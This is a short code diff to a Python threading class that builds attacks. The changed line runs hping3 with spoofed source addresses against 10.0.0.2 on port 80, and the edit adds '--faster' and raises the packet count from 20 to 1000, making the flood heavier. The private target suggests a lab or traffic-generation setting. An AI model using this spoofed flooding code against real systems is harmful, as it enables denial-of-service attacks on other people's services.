@@ -29,7 +29,7 @@ class Mythread (threading.Thread):
 
         self.attack_building(self.param)
 
-    def generation_ip(self, ip_number):
+    def generation_ip (self, ip_number):
 
 
         for rnd in range(ip_number):
@@ -85,7 +85,7 @@ class Mythread (threading.Thread):
 
         for ip_add in self.ip_list:
 
-            os.system('timeout {}s hping3 {} -a {} -V -p 80 -d {} -c 20 10.0.0.2'.format(
+            os.system('timeout {}s hping3 {} --faster -a {} -V -p 80 -d {} -c 1000 10.0.0.2'.format(
                 self.param['attack_time'],
                 self.param['attack_type'],
                 ip_add,
